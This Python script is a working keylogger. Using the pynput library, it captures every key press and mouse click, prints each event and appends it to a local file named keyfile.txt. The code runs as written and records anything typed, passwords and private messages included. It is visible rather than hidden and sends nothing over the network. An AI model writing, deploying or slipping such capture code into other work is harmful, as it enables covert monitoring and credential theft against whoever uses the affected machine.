from pynput import keyboard, mouse

def on_key_press(key):
    try:
        char = key.char
        print(f'Key pressed: {char}')
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(f'Key pressed: {char}\n')
    except AttributeError:
        print(f'Special key pressed: {key}')
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(f'Special key pressed: {key}\n')

def on_click(x, y, button, pressed):
    action = 'Pressed' if pressed else 'Released'
    print(f'Mouse {action} at ({x}, {y}) with {button}')
    with open("keyfile.txt", 'a') as logKey:
        logKey.write(f'Mouse {action} at ({x}, {y}) with {button}\n')

if __name__ == "__main__":
    # Keyboard listener
    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    keyboard_listener.start()

    # Mouse listener
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()

    # Keep the script running
    keyboard_listener.join()
    mouse_listener.join()
